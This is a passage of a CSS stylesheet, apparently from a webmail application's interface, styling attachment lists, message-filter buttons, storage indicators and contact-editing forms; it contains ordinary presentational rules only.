            padding-right: 3rem;
            padding: 16.5px 40px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border-bottom: 1px solid #acb0bf;
            margin: 0
        }

        .conversationPlaceholder #storageStatus .wrap span {
            color: #555
        }

        .conversationPlaceholder #storageStatus .wrap span strong {
            color: #9397cd
        }

        .conversationPlaceholder>p {
            margin: 2rem 0
        }

        .conversationPlaceholder section {
            border: 1px solid #acb0bf;
            margin: 20px 20px 0;
            padding: 1rem;
            border-radius: 2px
        }

        .conversationPlaceholder section a {
            display: block
        }

        .conversationPlaceholder section img {
            display: block;
            width: 100%;
            height: auto
        }

        .conversationPlaceholder section .latest-upgrade {
            display: block;
            position: relative;
            cursor: pointer
        }

        .conversationPlaceholder section .latest-upgrade button {
            position: absolute;
            left: 50%;
            width: 10rem;
            display: block;
            margin-left: -5rem;
            bottom: 2rem
        }

        .conversationPlaceholder .link {
            padding-bottom: 1rem;
            display: block;
            float: right
        }

        .conversationPlaceholder .link a {
            display: block;
            text-align: center;
            color: #9397cd;
            clear: both;
            line-height: 2rem;
            height: 2rem
        }

        .conversationPlaceholder .storageArea {
            padding: 0 6rem;
            position: relative;
            height: 2rem;
            line-height: 2rem;
            margin-bottom: 1rem
        }

        .conversationPlaceholder .storageArea .current {
            position: absolute;
            left: 0;
            top: 0;
            display: block;
            height: 2rem;
            line-height: 2rem
        }

        .conversationPlaceholder .storageArea .total {
            position: absolute;
            right: 0;
            top: 0;
            display: block;
            height: 2rem;
            line-height: 2rem
        }

        .conversationPlaceholder .storageArea div.storage {
            color: #bbb
        }

        .conversationPlaceholder .storageArea div.storage strong {
            color: #9397cd
        }

        .conversationPlaceholder .storageArea div.storage .fa {
            margin-right: .5rem;
            opacity: .5
        }

        .conversationPlaceholder .storageArea .storageBar {
            height: 12px;
            top: .6rem
        }

        element-view {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        .countElementsSelected-container {
            text-align: center
        }

        .countElementsSelected-title {
            font-weight: 400;
            margin-top: 1em
        }

        .countElementsSelected-icon {
            font-size: 1.5rem
        }

        .countElementsSelected-btn-unselect {
            float: none;
            display: inline-block;
            margin-top: 1.5em
        }

        .ptSelectConversation-label {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-justify-content: center;
            -webkit-box-pack: center;
            -ms-flex-pack: center;
            justify-content: center;
            position: relative;
            width: 100%;
            height: 100%
        }

        .moveElement-container.disabled [class*=moveElement-btn] {
            pointer-events: none;
            -webkit-box-shadow: none;
            box-shadow: none;
            color: #acb0bf;
            -webkit-box-shadow: inset 0 0 50rem 0 #f3f5f8;
            box-shadow: inset 0 0 50rem 0 #f3f5f8
        }

        .moveElement-btn-delete {
            display: none
        }

        .moveElement-container button+button {
            border-radius: 0
        }

        body[id^=secured-drafts] .moveElement-btn-trash,
        body[id^=secured-trash] .moveElement-btn-trash {
            display: none
        }

        body[id^=secured-drafts] .moveElement-btn-delete,
        body[id^=secured-trash] .moveElement-btn-delete {
            display: inline-block
        }

        body[id^=secured-drafts] .moveElement-btn-inbox,
        body[id^=secured-trash] .moveElement-btn-inbox {
            border-left: 0
        }

        body[id^=secured-spam] .moveElement-btn-delete {
            display: inline-block
        }

        body[id^=secured-archive] .moveElement-btn-archive,
        body[id^=secured-inbox] .moveElement-btn-inbox,
        body[id^=secured-sent] .moveElement-btn-inbox,
        body[id^=secured-spam] .moveElement-btn-spam {
            display: none
        }

        .advancedFilterElement-btn-drafts,
        .advancedFilterElement-btn-folder,
        .advancedFilterElement-btn-spam,
        .advancedFilterElement-btn-trash {
            display: none !important
        }

        .advancedFilterElement-state-drafts .advancedFilterElement-btn-drafts,
        .advancedFilterElement-state-folder .advancedFilterElement-btn-folder,
        .advancedFilterElement-state-spam .advancedFilterElement-btn-spam,
        .advancedFilterElement-state-trash .advancedFilterElement-btn-trash {
            display: inline-block !important
        }

        [class*=advancedFilterElement-btn] {
            overflow: hidden
        }

        [class*=advancedFilterElement-btn]>div {
            width: 100%;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            pointer-events: none
        }

        [class*=advancedFilterElement-btn]>div:before {
            width: 16px;
            height: 35px;
            margin-left: 5px;
            font-size: .8em;
            display: block;
            content: ""
        }

        [class*=advancedFilterElement-btn]>div>span {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap
        }

        [class*=advancedFilterElement-btn].active>div {
            font-weight: 700
        }

        [class*=advancedFilterElement-btn].active>div:before {
            font-family: FontAwesome;
            content: "\F00C"
        }

        .navElements-container * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .navElements-container:not(.navElements-displayed) {
            display: none
        }

        [class*=navElements-btn] {
            -webkit-box-shadow: none;
            box-shadow: none;
            border: 0;
            height: 100%;
            font-size: 14px
        }

        [class*=navElements-btn] * {
            pointer-events: none
        }

        [class*=navElements-btn]+[class*=navElements-btn] {
            border-left: 1px solid #acb0bf
        }

        .navElements-container.navElements-no-next .navElements-btn-next,
        .navElements-container.navElements-no-previous .navElements-btn-previous {
            opacity: .5;
            pointer-events: none
        }

        .pm_form .pm_select select.movedSelect-select {
            width: 15rem
        }

        #attachmentArea {
            position: relative;
            z-index: 0;
            padding: 0 10px;
            background: #fff;
            border-top: 1px solid #acb0bf
        }

        #attachmentArea header {
            height: 40px;
            line-height: 40px !important;
            position: relative;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            padding: 0 !important;
            margin-bottom: 0 !important;
            border-bottom: none !important
        }

        #attachmentArea header .embedded {
            color: #9397cd
        }

        #attachmentArea .title {
            position: relative;
            z-index: 2;
            display: inline-block;
            padding-right: 1rem
        }

        #attachmentArea em {
            position: absolute;
            left: 0;
            right: 0;
            top: 20px;
            height: 1px;
            width: 100%;
            display: block;
            z-index: 1
        }

        #attachmentArea .fa.fa-archive-o:before {
            content: "\F187"
        }

        #attachmentArea .fa.fa-audio-o:before {
            content: "\F1C7"
        }

        #attachmentArea .fa.fa-code-o:before {
            content: "\F1C9"
        }

        #attachmentArea .fa.fa-excel-o:before {
            content: "\F1C3"
        }

        #attachmentArea .fa.fa-image-o:before {
            content: "\F1C5"
        }

        #attachmentArea .fa.fa-movie-o:before {
            content: "\F1C8"
        }

        #attachmentArea .fa.fa-pdf-o:before {
            content: "\F1C1"
        }

        #attachmentArea .fa.fa-powerpoint-o:before {
            content: "\F1C4"
        }

        #attachmentArea .fa.fa-word-o:before {
            content: "\F1C2"
        }

        .eventsAttachments-container {
            clear: both;
            padding: .8rem .6rem .4rem
        }

        .eventsAttachments-hidden {
            display: none
        }

        .eventsAttachments-decrypt {
            opacity: .5
        }

        .eventsAttachments-download-link {
            line-height: 1;
            height: auto;
            float: right
        }

        .eventsAttachments-download-link * {
            pointer-events: none
        }

        .eventsAttachments-details {
            background: #fff;
            border-radius: 4px;
            margin-bottom: .5rem
        }

        .eventsAttachments-details-wrapper {
            padding: .8rem 1rem;
            border: 1px solid #e0e2e5
        }

        .eventsAttachments-details[open] .eventsAttachments-summary {
            border-radius: 4px 4px 0 0
        }

        .eventsAttachments-details[open] .eventsAttachments-summary:after {
            font-family: FontAwesome;
            content: "\F106"
        }

        .eventsAttachments-summary {
            background: #e6eaf0;
            padding: .7rem 1rem;
            border-radius: 4px
        }

        .eventsAttachments-summary:hover {
            cursor: pointer
        }

        .eventsAttachments-summary .fa {
            margin-right: 4px
        }

        .eventsAttachments-summary:after {
            font-family: FontAwesome;
            content: "\F107";
            float: right;
            margin-top: 1px;
            text-align: center
        }

        .eventsAttachments-summary::-webkit-details-marker {
            display: none
        }

        .eventsAttachments-container:not(.eventsAttachments-load) .eventsAttachments-placeholder {
            display: none
        }

        .eventsAttachments-description {
            white-space: pre-line
        }

        .eventsAttachments-details-table {
            word-break: break-all;
            text-align: left;
            width: 100%
        }

        .eventsAttachments-details-table tr th {
            width: 120px
        }

        .eventsAttachments-details-table tr td,
        .eventsAttachments-details-table tr th {
            padding: .4rem 0;
            vertical-align: top
        }

        .eventsAttachments-details-table ul {
            margin: 0;
            padding: 0;
            list-style-type: none
        }

        .eventsAttachments-details-table ul li {
            padding: .1rem 0
        }

        .listAttachments-container.hidden {
            display: none
        }

        .listAttachments-container {
            padding: 0 10px
        }

        .state-eoReply.listAttachments-container {
            padding: 0 35px
        }

        .listAttachments-item {
            padding-left: 3rem;
            padding-right: .5rem
        }

        .listAttachments-item * {
            pointer-events: none
        }

        [class*=listAttachments-icon] {
            color: #555;
            display: block;
            position: absolute;
            left: 0;
            top: 0;
            bottom: 0;
            width: 2.5rem;
            height: 40px;
            line-height: 40px;
            text-align: center;
            font-size: 22px;
            z-index: 2
        }

        [class*=listAttachments-icon].stuff {
            opacity: 0
        }

        [class*=listAttachments-icon].embedded {
            color: #9397cd
        }

        [class*=listAttachments-icon].stuff.fa-cog,
        [class*=listAttachments-icon].stuff.fa-download {
            opacity: 1;
            border-right: none
        }

        .listAttachments-icon-download,
        .listAttachments-icon-loader {
            display: none
        }

        .listAttachments-item-decrypt .listAttachments-icon-loader,
        .listAttachments-item-download .listAttachments-icon-download {
            display: inline-block
        }

        .listAttachments-item-decrypt .listAttachments-icon,
        .listAttachments-item-download .listAttachments-icon,
        .listAttachments-item-download .listAttachments-icon-loader {
            display: none
        }

        .listAttachments-list {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap
        }

        .listAttachments-list,
        .listAttachments-list .listAttachments-att {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .listAttachments-list .listAttachments-att {
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            margin: 0 10px 10px 0;
            color: #555;
            background: #fff;
            padding: 0;
            position: relative;
            height: 40px;
            line-height: 40px;
            background-color: #f4f4f4;
            max-width: 100%
        }

        .listAttachments-list .listAttachments-att:after {
            content: "";
            position: absolute;
            z-index: 1;
            left: 2.5rem;
            top: 0;
            bottom: 0;
            height: 40px;
            border-right: 1px solid #acb0bf;
            pointer-events: none
        }

        .listAttachments-list .listAttachments-att.remove {
            padding-right: 2.5rem
        }

        .listAttachments-list .listAttachments-att .name {
            text-transform: none;
            display: block;
            line-height: 15px;
            height: 15px;
            padding-top: 5px;
            white-space: nowrap;
            max-width: 100%;
            overflow: hidden;
            text-overflow: ellipsis;
            display: inline-block;
            float: left
        }

        .listAttachments-list .listAttachments-att .size {
            display: block;
            line-height: 15px;
            height: 15px;
            padding-bottom: 5px;
            float: left;
            clear: both
        }

        .listAttachments-list .listAttachments-att .removeButton {
            -moz-appearance: none;
            appearance: none;
            -webkit-appearance: none;
            background: transparent;
            border: none;
            cursor: pointer;
            position: relative;
            z-index: 999;
            font-size: 1rem
        }

        .listAttachments-list .listAttachments-att.placeholder {
            margin-right: 8rem
        }

        .listAttachments-btn-action-remove {
            display: none
        }

        .listAttachments-btn-action-remove i {
            pointer-events: none
        }

        .state-eoReply .listAttachments-btn-action-remove {
            display: block
        }

        [id=printer] .listAttachments-title-download,
        [id=printer] .listAttachments-title-size {
            display: none
        }

        [id=printer] a {
            pointer-events: none
        }

        .btnDownloadAttachments-container {
            cursor: pointer;
            padding: .5em
        }

        .btnDownloadAttachments-container:hover {
            color: #222
        }

        .btnDownloadAttachments-container * {
            pointer-events: none
        }

        .btnDownloadAttachments-container.btnDownloadAttachments-load .btnDownloadAttachments-icon-download,
        .btnDownloadAttachments-container:not(.btnDownloadAttachments-load) .btnDownloadAttachments-icon-loader {
            display: none
        }

        .attendeeItem-mailto-link {
            color: #9397cd
        }

        .contactArrowsSort-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: reverse;
            -webkit-flex-direction: column-reverse;
            -ms-flex-direction: column-reverse;
            flex-direction: column-reverse;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            width: 15px;
            height: 37px;
            pointer-events: none
        }

        .contactArrowsSort-container[order=asc] .fa-sort-asc,
        .contactArrowsSort-container[order=desc] .fa-sort-desc {
            color: #4d4c5d;
            opacity: 1
        }

        .contactArrowsSort-container>.fa-sort-asc,
        .contactArrowsSort-container>.fa-sort-desc {
            position: relative;
            opacity: .4
        }

        .contactArrowsSort-container>.fa-sort-desc {
            top: -6px
        }

        .contactArrowsSort-container>.fa-sort-asc {
            top: 6px
        }

        body.appConfigBody-is-mobile .contactArrowsSort-container {
            display: none
        }

        .contactError-container {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between;
            background: #ec6446;
            color: #fff;
            border: none;
            border-radius: 2px;
            padding: 5px
        }

        .contactError-container,
        .contactError-container>[class*=-item-] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%
        }

        .contactError-container>[class*=-item-] {
            position: relative;
            padding: 10px 0 10px 30px
        }

        .contactError-container>[class*=-item-]:before {
            position: absolute;
            left: 0;
            top: 0;
            height: 100%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            font-family: FontAwesome;
            width: 2.2em;
            font-size: 1.1em;
            content: "\F071"
        }

        .contactError-container>[class*=-item-] h2 {
            font-size: 1em
        }

        .contactError-container>[class*=-item-] p {
            margin: 0
        }

        .contactError-container>[class*=-item-] a {
            color: #fff;
            text-decoration: underline
        }

        .contactError-row {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .importCardDropzone-container:not(.importCardDropzone-has-file) .importCardDropzone-file,
        .importCardDropzone-has-file .importCardDropzone-dropzone {
            display: none
        }

        .contactDetails-container {
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            position: relative
        }

        .contactDetails-container,
        .contactDetails-nav {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactDetails-nav {
            height: 72px;
            min-height: 72px;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            -webkit-box-shadow: 0 1px 0 rgba(172, 176, 191, .3);
            box-shadow: 0 1px 0 rgba(172, 176, 191, .3)
        }

        .contactDetails-nav-title {
            font-size: 1.6em;
            font-weight: 200;
            margin-right: auto
        }

        .contactDetails-nav-left {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactDetails-nav-left>button {
            margin-right: 5px
        }

        .contactDetails-nav-right {
            -webkit-box-ordinal-group: 2;
            -webkit-order: 1;
            -ms-flex-order: 1;
            order: 1
        }

        .contactDetails-details {
            overflow: auto;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .contactDetails-details>* {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1
        }

        .contactDetails-fields-container {
            position: relative;
            margin-bottom: 20px;
            padding: 15px;
            border: 1px solid rgba(172, 176, 191, .3);
            border-radius: 3px
        }

        .contactDetails-fields-ico {
            display: block;
            width: 1.4rem;
            position: absolute;
            z-index: 4;
            top: -10px;
            left: calc(50% - .7rem);
            font-size: 1rem;
            text-align: center;
            color: #808097;
            border: medium none;
            background: #fff none repeat scroll 0 0
        }

        .contactDetails-fields-locked {
            position: absolute;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            z-index: 1;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            padding: 20px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            background: hsla(0, 0%, 100%, .7)
        }

        .contactDetails-fields-locked-notice {
            background: #fff;
            text-align: center;
            padding: 20px 30px;
            border: 1px solid #acb0bf;
            border-radius: 2px
        }

        .contactDetails-fields-locked-notice p {
            text-align: center
        }

        .contactEncrypted-encrypted-and-signed-icon {
            background: url(assets/img/lock-signed.svg) no-repeat 50%;
            content: " ";
            display: block;
            height: 17px;
            width: 17px;
            margin-left: 3px
        }

        .contactDetails-container .contactDetails-details {
            padding-top: 20px
        }

        .pm_modal .contactDetails-nav {
            display: none
        }

        .contactDetails-container .as-sortable-dragging {
            border-radius: 2px;
            overflow: hidden
        }

        .contactDetails-container .as-sortable-dragging .contactItem-sortable-wrapper {
            padding: 0;
            margin: 0;
            border: hidden;
            border: none
        }

        .appConfigBody-is-mobile .contactDetails-nav,
        .appConfigBody-is-tablet .contactDetails-nav {
            padding-right: 10px
        }

        .appConfigBody-is-mobile [class*=contactDetails-nav]>button,
        .appConfigBody-is-tablet [class*=contactDetails-nav]>button {
            margin-right: 5px
        }

        .appConfigBody-is-mobile .contactDetails-nav-left,
        .appConfigBody-is-tablet .contactDetails-nav-left {
            display: none
        }

        .appConfigBody-is-tablet .contactDetails-details {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row
        }

        @media (max-width:850px) {
            .appConfigBody-is-tablet .contactDetails-details {
                -webkit-box-orient: vertical;
                -webkit-box-direction: normal;
                -webkit-flex-direction: column;
                -ms-flex-direction: column;
                flex-direction: column
            }

            .appConfigBody-is-tablet .contactDetails-details .contactDetails-clear {
                margin-right: 0
            }
        }

        .appConfigBody-is-mobile .contactDetails-fields-locked {
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
            padding-top: 65px
        }

        .contactDetails-container [ng-messages] {
            display: none
        }

        .contactDetails-container.ng-invalid [ng-messages] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactDetails-container.ng-submitted .ng-invalid:not(:focus),
        .contactDetails-container .ng-submitted .ng-invalid:not(:focus),
        .contactDetails-container .ng-touched.ng-invalid:not(:focus) {
            border-color: #cc9393;
            -webkit-box-shadow: inset 0 1px 2px hsla(0, 36%, 69%, .3), 0 0 0 .2em hsla(0, 36%, 69%, .3);
            box-shadow: inset 0 1px 2px hsla(0, 36%, 69%, .3), 0 0 0 .2em hsla(0, 36%, 69%, .3)
        }

        .contactDetails-container .contactError-container,
        .contactDetails-container .contactError-container [class*=-item-],
        .contactDetails-container:not(.contactDetails-encrypted-and-signed) .contactEncrypted-signed-icon {
            display: none
        }

        .contactDetails-encrypted-error .contactEncrypted-container .contactError-container,
        .contactDetails-encrypted-error .contactEncrypted-container .contactError-container .contactError-item-encrypted,
        .contactDetails-encrypted-verification-error .contactEncrypted-container .contactError-container,
        .contactDetails-encrypted-verification-error .contactEncrypted-container .contactError-container .contactError-item-verification,
        .contactDetails-verification-error .contactClear-container .contactError-container,
        .contactDetails-verification-error .contactClear-container .contactError-item-verification {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactDetails-encrypted-error .fa-lock,
        .contactDetails-encrypted-verification-error .fa-certificate {
            color: #ec6446
        }

        .contactDetails-encrypted-error .contactEncrypted-container .contactDetails-fields-container,
        .contactDetails-encrypted-verification-error .contactEncrypted-container .contactDetails-fields-container,
        .contactDetails-verification-error .contactClear-container .contactDetails-fields-container {
            border-color: #ec6446
        }

        .contactEncrypted-container:not(.contactDetails-show-custom-fields) .contactDetails-custom-fields {
            display: none
        }

        .contactDetails-toggle-custom-fields {
            display: none;
            background: transparent;
            border: 0;
            text-decoration: underline;
            color: #9397cd
        }

        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-country,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-extended,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-label,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-locality,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-post-box,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-postal-code,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-region,
        .contactAddressInput-container:not(.contactAddressInput-focussed) .contactAddressInput-street,
        .contactItem-container-Name .contactItem-row:not(:first-child) {
            display: none
        }

        .contactAddressInput-container:not(.contactAddressInput-focussed) textarea {
            min-height: 100px
        }

        .contactAddressInput-container:not(.contactAddressInput-show-extended) .contactAddressInput-extended,
        .contactAddressInput-container:not(.contactAddressInput-show-extended) .contactAddressInput-extended-label,
        .contactAddressInput-container:not(.contactAddressInput-show-post-box) .contactAddressInput-post-box,
        .contactAddressInput-container:not(.contactAddressInput-show-post-box) .contactAddressInput-post-box-label,
        .contactAddressInput-focussed .contactAddressInput-default {
            display: none
        }

        .contactAddressInput-grid {
            -webkit-box-pack: justify;
            -webkit-justify-content: space-between;
            -ms-flex-pack: justify;
            justify-content: space-between
        }

        .contactAddressInput-col,
        .contactAddressInput-grid {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactAddressInput-col {
            -webkit-box-flex: 1;
            -webkit-flex: 1;
            -ms-flex: 1;
            flex: 1;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .contactAddressInput-col * {
            width: 100%
        }

        .contactAddressInput-col:last-child {
            margin-left: 2px
        }

        .contactAddressInput-label {
            color: #9397cd;
            font-size: .8em;
            line-height: 20px
        }

        .contactPhotoRow-container {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex
        }

        .contactPhotoRow-image {
            cursor: pointer;
            max-height: 65px;
            max-width: 65px
        }

        .contactPhotoRow-edit-button,
        .contactPhotoRow-image {
            margin-right: 10px
        }

        .contactPhotoModal-input-file,
        .contactPhotoRow-hide-clear-button .contactPhotoRow-clear-button {
            display: none
        }

        .pm_form .contactPhotoModal-input-label {
            text-decoration: none;
            color: #666;
            padding: 0 10px;
            height: 35px;
            line-height: 35px;
            border: 1px solid #acb0bf;
            border-radius: 2px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            display: inline-block;
            cursor: pointer;
            font-size: 12px;
            text-transform: uppercase;
            background-color: transparent;
            -webkit-transition: all .3s ease-out;
            transition: all .3s ease-out;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            vertical-align: middle
        }

        .contactPhotoModal-input-label:hover {
            background-color: #f2f2f2;
            color: #222;
            -webkit-transition: none;
            transition: none
        }

        .contactItem-container {
            padding: 0;
            margin-bottom: 15px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .contactItem-container-Notes {
            position: relative;
            margin-top: 20px;
            padding-top: 10px;
            margin-bottom: 10px
        }

        .contactItem-container-Notes:before {
            content: "";
            position: absolute;
            height: 1px;
            top: -10px;
            left: 0;
            right: 0;
            background: rgba(172, 176, 191, .3)
        }

        .contactItem-row {
            position: relative;
            overflow: visible;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            width: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            margin-bottom: 2px
        }

        .contactItem-row input,
        .contactItem-row textarea {
            outline: 0;
            border-radius: 2px
        }

        .contactItem-row input {
            height: 36px
        }

        .contactItem-sortable-wrapper {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            border: 2px dashed transparent;
            border-radius: 2px;
            cursor: default
        }

        .contactItem-sortable-wrapper.sortable {
            cursor: move
        }

        .contactItem-label {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start
        }

        .contactItem-label>input {
            position: relative;
            opacity: .8;
            color: #505061;
            background: transparent;
            -webkit-box-shadow: none;
            box-shadow: none;
            cursor: default;
            margin: 0;
            padding: 0 30px;
            border: 0
        }

        .contactItem-label>input~i.fa-chevron-down,
        .contactItem-label>input~i.itemIcon {
            position: absolute;
            line-height: 36px
        }

        .contactItem-label>input~i.itemIcon {
            left: 10px;
            width: 16px;
            text-align: center
        }

        .contactItem-label>input~i.fa-chevron-down {
            right: 10px;
            font-size: .6rem;
            opacity: .8;
            display: none
        }

        .contactItem-label>input.contactItem-label-selectable {
            cursor: pointer
        }

        .contactItem-label>input.contactItem-label-selectable~i.fa-chevron-down {
            display: block
        }

        .contactItem-label>input.contactItem-label-editable {
            cursor: pointer;
            border: 1px solid transparent;
            border-radius: 2px;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .contactItem-label>input.contactItem-label-editable:focus,
        .contactItem-label>input.contactItem-label-editable:hover {
            border-color: #acb0bf
        }

        .contactItem-label>input.contactItem-label-editable:focus {
            cursor: text
        }

        .contactItem-label-selectable~i.fa-chevron-down,
        .contactItem-label-selectable~i.itemIcon {
            cursor: pointer
        }

        .contactItem-selectType {
            position: absolute;
            left: 0;
            right: 0;
            top: 35px;
            z-index: 10;
            list-style: none;
            padding: 0;
            margin: 0;
            border: 1px solid rgba(0, 0, 0, .2);
            -webkit-box-shadow: 0 1px 2px rgba(0, 0, 0, .2);
            box-shadow: 0 1px 2px rgba(0, 0, 0, .2);
            background: #fff;
            border-radius: 2px;
            max-height: 160px;
            overflow: auto
        }

        .contactItem-selectType li {
            display: block
        }

        .contactItem-selectType li.selected {
            font-weight: 700
        }

        .contactItem-selectType li a {
            color: #505061;
            display: block;
            padding: 8px 30px;
            text-decoration: none;
            cursor: pointer
        }

        .contactItem-selectType li a:hover {
            background: #f4f4f4
        }

        .contactItem-aside {
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            -webkit-box-align: start;
            -webkit-align-items: flex-start;
            -ms-flex-align: start;
            align-items: flex-start;
            -webkit-box-pack: end;
            -webkit-justify-content: flex-end;
            -ms-flex-pack: end;
            justify-content: flex-end;
            margin-left: 8px
        }

        .contactItem-aside,
        .contactItem-inputs {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1
        }

        .contactItem-inputs input,
        .contactItem-inputs textarea {
            -moz-appearance: none;
            -webkit-appearance: none;
            appearance: none;
            background: #fafafa;
            border-radius: 2px;
            border: 1px solid #acb0bf;
            -webkit-box-shadow: inset 0 2px 4px rgba(0, 0, 0, .15);
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, .15);
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #222;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            font-size: 1em;
            height: 35px;
            line-height: 32px;
            padding: 0 10px;
            resize: auto
        }

        .contactItem-inputs input:focus,
        .contactItem-inputs textarea:focus {
            color: #000;
            border-color: #9397cd;
            outline: none
        }

        .contactItem-inputs input.contactItem-input-with-icon,
        .contactItem-inputs textarea.contactItem-input-with-icon {
            padding-right: 35px
        }

        .contactItem-inputs textarea {
            font: inherit;
            min-height: 65px;
            padding: 8px 10px;
            line-height: 20px;
            -webkit-transition: height .1s ease;
            transition: height .1s ease;
            resize: none
        }

        .contactAddressInput-container {
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column
        }

        .contactAddressInput-container>* {
            margin-bottom: 2px
        }

        .contactItem-actions {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            min-width: 45px
        }

        .contactItem-container:not(.as-sortable-disabled) .contactItem-actions {
            display: none
        }

        .contactItem-delete {
            height: 36px;
            cursor: pointer;
            color: #9397cd;
